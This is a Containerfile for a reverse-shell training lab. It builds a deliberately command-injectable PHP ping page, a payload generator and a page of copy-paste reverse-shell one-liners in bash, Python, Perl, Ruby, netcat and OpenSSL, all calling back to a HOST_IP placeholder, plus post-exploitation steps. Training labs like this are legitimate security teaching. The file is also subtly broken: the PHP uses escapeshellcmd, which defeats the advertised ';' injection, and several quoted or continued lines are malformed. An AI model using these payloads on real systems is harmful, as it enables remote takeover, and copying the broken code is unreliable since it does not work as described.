# reverse-shells.Containerfile
# Reverse Shell Practice Lab
#
# A container with a command-injection-vulnerable web app and
# all common reverse shell tools pre-installed. Students:
#   1. Start a listener on their host
#   2. Trigger command injection via the web app
#   3. Receive a reverse shell
#   4. Practice TTY upgrade and post-exploitation
#
# Build:
#   podman build -t reverse-shells-lab -f reverse-shells.Containerfile .
#
# Run:
#   podman run -it --rm -p 8080:80 --name revshell-lab reverse-shells-lab
#
# Access the vulnerable app:
#   http://localhost:8080/
#   http://localhost:8080/ping.php?host=8.8.8.8
#
# Host listener (before triggering the reverse shell):
#   nc -lvnp 4444
#   # or: pwncat-cs -lp 4444
#   # or: rlwrap nc -lvnp 4444
#
# Reverse shell payload (paste as the "host" parameter):
#   ;bash -c 'bash -i >& /dev/tcp/HOST_IP/4444 0>&1'
#   ;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
#
# Replace HOST_IP with your host's IP (usually 172.17.0.1 or 10.0.2.2).
#
# ────────────────────────────────────────────────────────────

FROM docker.io/alpine:latest

# ── Install all languages and tools needed for reverse shell practice ──
RUN apk add --no-cache \
    bash \
    python3 \
    py3-pip \
    perl \
    perl-socket \
    ruby \
    ruby-io-console \
    lua5.3 \
    lua5.3-socket \
    php \
    php-cli \
    php-curl \
    php-fpm \
    netcat-openbsd \
    ncat \
    openssl \
    socat \
    curl \
    wget \
    busybox-extras \
    procps \
    util-linux \
    tmux \
    vim \
    git \
    gcc \
    musl-dev \
    make \
    gawk \
    xxd

# ── Create web server user ──
RUN adduser -D -s /sbin/nologin www-data

# ── Set up web root ──
RUN mkdir -p /var/www/html && chown www-data:www-data /var/www/html

# ── Vulnerable ping.php — command injection via "host" parameter ──
RUN printf '%s\n' \
    '<?php' \
    '/**' \
    ' * ping.php — Network Diagnostic Tool' \
    ' * Usage: GET /ping.php?host=8.8.8.8' \
    ' *' \
    ' * WARNING: This tool is intentionally vulnerable to command injection' \
    ' * for educational purposes in the reverse shells lab.' \
    ' * The "host" parameter is passed unsanitized to shell_exec().' \
    ' */' \
    '' \
    'header("Content-Type: text/plain; charset=utf-8");' \
    '' \
    'if (!isset($_GET["host"]) || empty($_GET["host"])) {' \
    '    echo "Usage: /ping.php?host=<ip_address>\n";' \
    '    echo "Example: /ping.php?host=8.8.8.8\n";' \
    '    exit(0);' \
    '}' \
    '' \
    '$host = $_GET["host"];' \
    '' \
    '/**' \
    ' * VULNERABILITY: Unvalidated user input passed directly to shell.' \
    ' * Exploit examples:' \
    ' *   /ping.php?host=;id' \
    ' *   /ping.php?host=;cat /etc/passwd' \
    ' *   /ping.php?host=;bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"' \
    ' *   /ping.php?host=;python3 -c "reverse shell one-liner"' \
    ' */' \
    '$output = shell_exec("ping -c 4 " . escapeshellcmd($host) . " 2>&1");' \
    '' \
    'echo "=== Ping Result for $host ===\n";' \
    'echo $output;' \
    > /var/www/html/ping.php

# ── Index page with lab instructions ──
RUN printf '%s\n' \
    '<!DOCTYPE html>' \
    '<html lang="en">' \
    '<head>' \
    '    <meta charset="UTF-8">' \
    '    <meta name="viewport" content="width=device-width, initial-scale=1.0">' \
    '    <title>Reverse Shell Practice Lab</title>' \
    '    <style>' \
    '        body { font-family: monospace; max-width: 900px; margin: 40px auto; padding: 20px; background: #1a1a2e; color: #eee; line-height: 1.6; }' \
    '        h1 { color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }' \
    '        h2 { color: #0f3460; background: #16213e; padding: 8px 16px; border-left: 4px solid #e94560; }' \
    '        code { background: #0f3460; padding: 2px 6px; border-radius: 3px; color: #f5c542; }' \
    '        pre { background: #0d1117; padding: 16px; border-radius: 6px; overflow-x: auto; border: 1px solid #30363d; }' \
    '        .note { background: #16213e; border-left: 4px solid #f5c542; padding: 12px 16px; margin: 16px 0; }' \
    '        .danger { background: #2d132c; border-left: 4px solid #e94560; padding: 12px 16px; margin: 16px 0; }' \
    '        ul { padding-left: 24px; }' \
    '        li { margin: 8px 0; }' \
    '    </style>' \
    '</head>' \
    '<body>' \
    '    <h1>&#9654; Reverse Shell Practice Lab</h1>' \
    '' \
    '    <div class="danger">' \
    '        <strong>LAB ENVIRONMENT ONLY</strong> — This container is intentionally vulnerable. ' \
    '        Never expose it to a real network. Run with <code>podman run -p 8080:80</code> and access via localhost.' \
    '    </div>' \
    '' \
    '    <h2>Available Tools (on target)</h2>' \
    '    <ul>' \
    '        <li><code>bash</code> — <code>/dev/tcp</code> reverse shell (bash -i >& /dev/tcp/IP/PORT 0>&1)</li>' \
    '        <li><code>python3</code> — socket + pty reverse shell</li>' \
    '        <li><code>perl</code> — socket reverse shell</li>' \
    '        <li><code>ruby</code> — TCPSocket reverse shell</li>' \
    '        <li><code>php</code> — fsockopen + exec</li>' \
    '        <li><code>lua</code> — luasocket reverse shell</li>' \
    '        <li><code>awk</code> — /inet/tcp reverse shell</li>' \
    '        <li><code>nc</code> — netcat reverse shell (FIFO method)</li>' \
    '        <li><code>ncat</code> — nmap netcat with SSL support</li>' \
    '        <li><code>openssl</code> — encrypted reverse shell</li>' \
    '        <li><code>socat</code> — advanced socket relay</li>' \
    '    </ul>' \
    '' \
    '    <h2>The Vulnerable Endpoint</h2>' \
    '    <p><a href="/ping.php?host=8.8.8.8" style="color:#f5c542;">/ping.php?host=8.8.8.8</a></p>' \
    '    <p>The <code>host</code> parameter is passed to a shell command without sanitization. ' \
    '    Inject commands after <code>;</code>:</p>' \
    '    <pre>/ping.php?host=8.8.8.8;id</pre>' \
    '' \
    '    <h2>Step-by-Step Exercise</h2>' \
    '' \
    '    <h3>Step 1 — Start your listener</h3>' \
    '    <p>On your <strong>host machine</strong> (not this container):</p>' \
    '    <pre>nc -lvnp 4444</pre>' \
    '    <p>Advanced options:</p>' \
    '    <pre>rlwrap nc -lvnp 4444      # with command history' \
    'pwncat-cs -lp 4444         # auto TTY upgrade + file transfer' \
    'msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"</pre>' \
    '' \
    '    <h3>Step 2 — Find your host IP</h3>' \
    '    <p>From inside this container, check which IP reaches your host:</p>' \
    '    <pre>ip route | grep default' \
    '# Usually: 172.17.0.1 or 10.0.2.2' \
    '' \
    '# Test connectivity from inside the container:' \
    'curl http://HOST_IP:4444 2>&1' \
    '# If your listener receives garbage data — connectivity works</pre>' \
    '' \
    '    <h3>Step 3 — Deliver the reverse shell</h3>' \
    '    <p>Pick a payload and URL-encode it as the <code>host</code> parameter:</p>' \
    '' \
    '    <h4>Bash (simplest — if /dev/tcp works):</h4>' \
    '    <pre>/ping.php?host=;bash -c "bash -i >%26 /dev/tcp/HOST_IP/4444 0>%261"</pre>' \
    '' \
    '    <h4>Python 3 (most reliable):</h4>' \
    '    <pre>/ping.php?host=;python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"HOST_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"</pre>' \
    '' \
    '    <h4>Netcat FIFO (if -e flag unavailable):</h4>' \
    '    <pre>/ping.php?host=;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>%261|nc HOST_IP 4444 >/tmp/f</pre>' \
    '' \
    '    <h4>Encrypted (OpenSSL):</h4>' \
    '    <pre>/ping.php?host=;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>%261|openssl s_client -quiet -connect HOST_IP:4444 >/tmp/f</pre>' \
    '' \
    '    <h3>Step 4 — Upgrade to full TTY</h3>' \
    '    <p>Once you have a shell:</p>' \
    '    <pre>python3 -c "import pty;pty.spawn(\"/bin/bash\")"' \
    '# Press Ctrl+Z to background' \
    'stty raw -echo; fg' \
    'export TERM=xterm-256color' \
    '# Now you have: tab completion, arrow keys, Ctrl+C isolation'</pre>' \
    '' \
    '    <h3>Step 5 — Post-exploitation exercise</h3>' \
    '    <pre>id' \
    'uname -a' \
    'cat /etc/os-release' \
    'sudo -l' \
    'find / -perm -4000 -type f 2>/dev/null  # SUID binaries' \
    'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null' \
    'cat /etc/passwd' \
    'ls -la /home/' \
    'ss -tlnp' \
    '# Now try privilege escalation from www-data to root!</pre>' \
    '' \
    '    <div class="note">' \
    '        <strong>Tip:</strong> If your reverse shell connects but the prompt doesn\'t appear, ' \
    '        press Enter a few times. Some shells need initial input before displaying PS1. ' \
    '        If the shell immediately disconnects, check that your listener is on the correct' \
    '        interface (0.0.0.0) and the port is not blocked by a firewall.' \
    '    </div>' \
    '' \
    '    <h2>One-Liner Reference</h2>' \
    '    <p>Copy-paste these into the <code>host=</code> parameter (URL-encode <code>&</code> as <code>%26</code>):</p>' \
    '    <pre># Bash' \
    'bash -i >%26 /dev/tcp/HOST/4444 0>%261' \
    '' \
    '# Python 3 PTY (recommended)' \
    'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"HOST\",4444));[os.dup2(s.fileno(),d)for d in(0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])"' \
    '' \
    '# Perl' \
    'perl -e "use Socket;\$i=\"HOST\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">%26S\");open(STDOUT,\">%26S\");open(STDERR,\">%26S\");exec(\"/bin/bash -i\");"' \
    '' \
    '# Ruby' \
    'ruby -rsocket -e "f=TCPSocket.open(\"HOST\",4444).to_i;exec sprintf(\"/bin/bash -i <%26%d >%26%d 2>%26%d\",f,f,f)"' \
    '' \
    '# OpenSSL encrypted' \
    'mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>%261|openssl s_client -quiet -connect HOST:4444 >/tmp/f'</pre>' \
    '' \
    '</body>' \
    '</html>' \
    > /var/www/html/index.html

RUN chown -R www-data:www-data /var/www/html

# ── Create a helper script to find host IP ──
RUN printf '%s\n' \
    '#!/bin/bash' \
    '# find-host-ip.sh — Determine which IP on the host is reachable from this container.' \
    'echo "[*] Default gateway (usually the host):"' \
    'ip route | grep default | awk "{print \$3}"' \
    'echo ""' \
    'echo "[*] All routes:"' \
    'ip route' \
    'echo ""' \
    'echo "[*] Try connecting to your host listener:"' \
    'echo "    curl http://\$(ip route | grep default | awk \"{print \$3}\"):4444 2>&1"' \
    > /usr/local/bin/find-host-ip.sh
RUN chmod +x /usr/local/bin/find-host-ip.sh

# ── Create a quick-launch listener script (for in-container practice) ──
RUN printf '%s\n' \
    '#!/bin/bash' \
    '# quick-listener.sh — Start a listener inside the container for local testing.' \
    '# Useful for testing reverse shells without a second host.' \
    'PORT="${1:-4444}"' \
    'echo "[+] Starting listener on port $PORT..."' \
    'echo "[+] Try: /ping.php?host=;bash -c \"bash -i >%26 /dev/tcp/127.0.0.1/$PORT 0>%261\""' \
    'nc -lvnp "$PORT"' \
    > /usr/local/bin/quick-listener.sh
RUN chmod +x /usr/local/bin/quick-listener.sh

# ── Reverse shell payload generator ──
RUN printf '%s\n' \
    '#!/usr/bin/env python3' \
    '"""Generate URL-encoded reverse shell payloads for the lab."""' \
    'import sys' \
    'import urllib.parse' \
    '' \
    'PAYLOADS = {' \
    '    "bash": \'bash -i >& /dev/tcp/{host}/{port} 0>&1\',' \
    '    "python3": (' \
    '        \'python3 -c "import socket,subprocess,os;\'' \
    '        \'s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\'' \
    '        \'s.connect((\\\"{host}\\\",{port}));\'' \
    '        \'[os.dup2(s.fileno(),d) for d in (0,1,2)];\'' \
    '        \'subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])"\''
    '    ),' \
    '    "nc": \'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f\',' \
    '    "perl": (' \
    '        \'perl -e "use Socket;\\$i=\\\"{host}\\\";\\$p={port};\'' \
    '        \'socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));\'' \
    '        \'connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));\'' \
    '        \'open(STDIN,\\\">&S\\\");\'' \
    '        \'open(STDOUT,\\\">&S\\\");\'' \
    '        \'open(STDERR,\\\">&S\\\");\'' \
    '        \'exec(\\\"/bin/bash -i\\\");"\''
    '    ),' \
    '}' \
    '' \
    'if __name__ == "__main__":' \
    '    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"' \
    '    port = sys.argv[2] if len(sys.argv) > 2 else "4444"' \
    '' \
    '    print(f"[*] Generating payloads for {host}:{port}\n")' \
    '    for name, template in PAYLOADS.items():' \
    '        payload = template.format(host=host, port=port)' \
    '        encoded = urllib.parse.quote(payload, safe="")' \
    '        print(f"--- {name} ---")' \
    '        print(f"Raw:     {payload}")' \
    '        print(f"Encoded: {encoded}")' \
    '        print()' \
    > /usr/local/bin/gen-payload.py
RUN chmod +x /usr/local/bin/gen-payload.py

# ── PHAR-based PHP web server launcher script ──
# PHP's built-in server is the simplest way to serve the vulnerable app
RUN printf '%s\n' \
    '#!/bin/bash' \
    '# start-web.sh — Launch the vulnerable web app' \
    'cd /var/www/html' \
    'echo "╔══════════════════════════════════════════════════════════╗"' \
    'echo "║          Reverse Shell Practice Lab                     ║"' \
    'echo "╠══════════════════════════════════════════════════════════╣"' \
    'echo "║  Web server: http://localhost:80                        ║"' \
    'echo "║  Exploit:    /ping.php?host=8.8.8.8;id                  ║"' \
    'echo "║                                                          ║"' \
    'echo "║  To find your host IP from inside the container:        ║"' \
    'echo "║    ip route | grep default                              ║"' \
    'echo "║                                                          ║"' \
    'echo "║  Start listener on HOST before triggering reverse shell:║"' \
    'echo "║    nc -lvnp 4444                                        ║"' \
    'echo "║                                                          ║"' \
    'echo "║  In-container listener (for testing isolated):          ║"' \
    'echo "║    quick-listener.sh 4444                               ║"' \
    'echo "║    Then: /ping.php?host=;bash -c ... 127.0.0.1 4444    ║"' \
    'echo "╚══════════════════════════════════════════════════════════╝"' \
    '' \
    'exec php -S 0.0.0.0:80 -t /var/www/html' \
    > /usr/local/bin/start-web.sh
RUN chmod +x /usr/local/bin/start-web.sh

# ── MOTD banner ──
RUN printf '%s\n' \
    '' \
    ' ██████╗ ███████╗██╗   ██╗    ███████╗██╗  ██╗███████╗██╗     ██╗' \
    ' ██╔══██╗██╔════╝██║   ██║    ██╔════╝██║  ██║██╔════╝██║     ██║' \
    ' ██████╔╝█████╗  ██║   ██║    ███████╗███████║█████╗  ██║     ██║' \
    ' ██╔══██╗██╔══╝  ╚██╗ ██╔╝    ╚════██║██╔══██║██╔══╝  ██║     ██║' \
    ' ██║  ██║███████╗ ╚████╔╝     ███████║██║  ██║███████╗███████╗███████╗' \
    ' ╚═╝  ╚═╝╚══════╝  ╚═══╝      ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝' \
    '' \
    '  ┌─── Reverse Shell Practice Lab ───┐' \
    '  │  start-web.sh  — Launch web app  │' \
    '  │  gen-payload.py IP PORT          │' \
    '  │  quick-listener.sh [PORT]        │' \
    '  │  find-host-ip.sh                 │' \
    '  └──────────────────────────────────┘' \
    '  Type start-web.sh to begin the lab.' \
    '' \
    > /etc/motd

# ── Expose web port ──
EXPOSE 80

# ── Entrypoint: drop into bash with helpful info ──
WORKDIR /var/www/html
USER www-data

# Start the web server and provide shell access via tmux
# (tmux lets you have the server running while still interacting with the container)
CMD ["/bin/bash", "-c", "\
    echo '[*] Starting PHP web server on port 80...'; \
    php -S 0.0.0.0:80 -t /var/www/html &>/tmp/php-server.log & \
    echo '[*] Web server PID:' $!; \
    echo '[*] Access the lab at http://localhost:80'; \
    echo '[*] Start your listener on the HOST: nc -lvnp 4444'; \
    echo '[*] Container IP info:'; \
    ip addr show eth0 2>/dev/null | grep inet; \
    echo ''; \
    echo '[*] Generate payloads: gen-payload.py YOUR_HOST_IP 4444'; \
    echo ''; \
    exec /bin/bash \
"]
